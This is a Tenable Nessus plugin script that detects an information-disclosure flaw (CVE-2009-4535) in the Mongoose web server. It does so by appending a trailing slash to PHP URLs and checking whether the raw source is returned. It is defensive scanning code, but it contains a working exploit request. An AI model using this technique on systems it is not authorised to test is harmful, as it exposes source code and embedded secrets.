#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(48201);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_cve_id("CVE-2009-4535");
  script_bugtraq_id(42051);
  script_osvdb_id(61490);
  script_xref(name:"EDB-ID", value:"9897");

  script_name(english:"Mongoose URI Trailing Slash Request Source Code Disclosure");
  script_summary(english:"Tries to read the source of hosted PHP script");
 
  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server is affected by an information disclosure
vulnerability."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The version of the Mongoose web server running on the remote host
discloses the source code of files such as PHP scripts when a trailing
slash ('/') is appended to a URL. 

An unauthenticated, remote attacker can leverage this issue to disclose
the source of scripts, which may contain passwords and other sensitive
information."
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://code.google.com/p/mongoose/issues/detail?id=94&can=1"
  );
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(200);
  script_set_attribute(attribute:"vuln_publication_date", value:"2009/10/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/30");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# Check if it has a Server response header -- Mongoose doesn't.
banner = get_http_banner(port:port);
if (!banner) exit(1, "Failed to retrieve the banner from the web server on port "+ port +".");
if ("Server:" >< banner) exit(0, "Mongoose doesn't send a Server response header while the web server listening on port "+port+" does.");


# Unless we're paranoid, see if it behaves like Mongoose.
if (report_paranoia < 2)
{
  nonexistent = '/' + unixtime() + '-' + SCRIPT_NAME;
  res = http_send_recv3(method:"GET", item:nonexistent, port:port, fetch404:TRUE, exit_on_fail:TRUE);
  if (!res[2] || "Error 404: Not Found" >!< res[2]) 
    exit(0, "The web server listening on port "+port+" does not appear to be Mongoose.");
}


# NB: check a couple of files in case some don't contain any PHP code
#     or include it in the generated output.
max_files = 5;
open_tag_pat = '<(\\?(php)? |% |script +language="php">)';
close_tag_pat = '(\\?|%|</script)>';

files = get_kb_list("www/"+port+"/content/extensions/php");
if (isnull(files)) files = make_list("/index.php");
else files = make_list(files);

n = 0;
foreach file (files)
{
  ++n;

  # Try to exploit the issue.
  exploit = file + '/';
  res = http_send_recv3(method:"GET", item:exploit, port:port, exit_on_fail:TRUE);

  # If it looks like source...
  if (
    "Content-Type: text/plain" >< res[1] &&
    res[2] && 
    egrep(pattern:open_tag_pat, string:res[2]) &&
    egrep(pattern:close_tag_pat, string:res[2])
  )
  {
    # Make sure it's not normally there.
    res2 = http_send_recv3(method:"GET", item:file, port:port, exit_on_fail:TRUE);
    if (
      res2[2] && 
      !egrep(pattern:open_tag_pat, string:res2[2]) &&
      # nb: don't worry about '</script>' in regular response.
      !egrep(pattern:close_tag_pat-'|</script', string:res2[2])
    )
    {
      if (report_verbosity > 0)
      {
        report = 
          '\n' + "Nessus was able to retrieve the source of '" + file + "' using" +
          '\nthe following URL :' +
          '\n' +
          '\n  ' + build_url(port:port, qs:exploit) + '\n';

        if (report_verbosity > 1)
        {
          report += 
            '\nHere it is :' +
            '\n' +
            '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
            '\n' + res[2] +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }

  if (n > max_files) break;
}
exit(0, "The web server listening on port "+port+" does not seem to be affected.");
